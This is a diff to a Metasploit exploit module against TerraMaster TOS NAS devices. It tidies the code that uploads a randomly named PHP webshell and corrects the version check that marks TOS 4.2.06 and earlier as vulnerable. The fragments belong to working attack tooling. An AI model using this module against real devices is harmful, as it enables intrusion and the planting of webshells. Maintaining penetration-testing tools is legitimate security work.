@@ -97,13 +97,8 @@ class MetasploitModule < Msf::Exploit::Remote
   end
 
   def upload_webshell
-    # randomize file name and extension if option WEBSHELL is not set
-    file_ext = %w[php]
-    @webshell_name = if datastore['WEBSHELL'].blank?
-                       "#{Rex::Text.rand_text_alpha(8..16)}.#{file_ext.sample}"
-                     else
-                       datastore['WEBSHELL'].to_s
-                     end
+    # randomize file name if option WEBSHELL is not set
+    @webshell_name = (datastore['WEBSHELL'].blank? ? "#{Rex::Text.rand_text_alpha(8..16)}.php" : datastore['WEBSHELL'].to_s)
 
     @post_param = Rex::Text.rand_text_alphanumeric(1..8)
     @get_param = Rex::Text.rand_text_alphanumeric(1..8)
@@ -185,7 +180,7 @@ class MetasploitModule < Msf::Exploit::Remote
     get_terramaster_info
     return CheckCode::Safe if @terramaster.empty?
 
-    if @terramaster['tos_version'] <= '4.2.06'
+    if Rex::Version.new(@terramaster['tos_version']) <= Rex::Version.new('4.2.06')
       return CheckCode::Vulnerable("TOS version is #{@terramaster['tos_version']} and CPU architecture is #{@terramaster['cpu_arch']}.")
     else
       return CheckCode::Safe("TOS version is #{@terramaster['tos_version']} and CPU architecture is #{@terramaster['cpu_arch']}.")
